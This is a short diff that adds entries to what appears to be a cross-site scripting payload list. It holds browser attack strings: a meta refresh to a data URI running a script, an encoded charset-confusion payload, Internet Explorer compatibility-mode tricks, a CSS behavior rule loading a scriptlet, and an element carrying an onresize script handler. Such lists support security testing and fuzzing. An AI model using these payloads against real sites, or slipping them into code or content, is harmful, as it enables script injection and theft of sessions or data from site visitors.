@@ -127,3 +127,7 @@ something%00html
 }
 <meta http-equiv="Refresh" content="0;url=data:,<script>alert(document.domain)</script>">
 %3Cmeta%20charset=cp1025%3E%27%20L%C9%86%D9%81%D4%85%40%C9%84~[%40%D6%95%D4%96%E4%A2%85%D6%A5%C5%99~m~%60JZ^NNm^mm~mNm^mmmm~mmNmm^mmmmmm~mmmmNmm^[JMOO}}N}}]JmZNMOO}}N}}]JmmZNMOO}}N}}]JmmmmZNMO}}N}}]JmZNM[N}}]JmmmmmmZZMm]n
+<meta http-equiv="X-UA-Compatible" content="IE=5"><a style="><!$%/()=?`C\o\l\o\r!?=red">A
+<meta http-equiv="X-UA-Compatible" content="IE=5"><a style="font-family:}behavior=URL(\.sct)">B
+<meta http-equiv=x-ua-compatible content=ie=8>
+1<comment onresize=alert(1) contenteditable>1
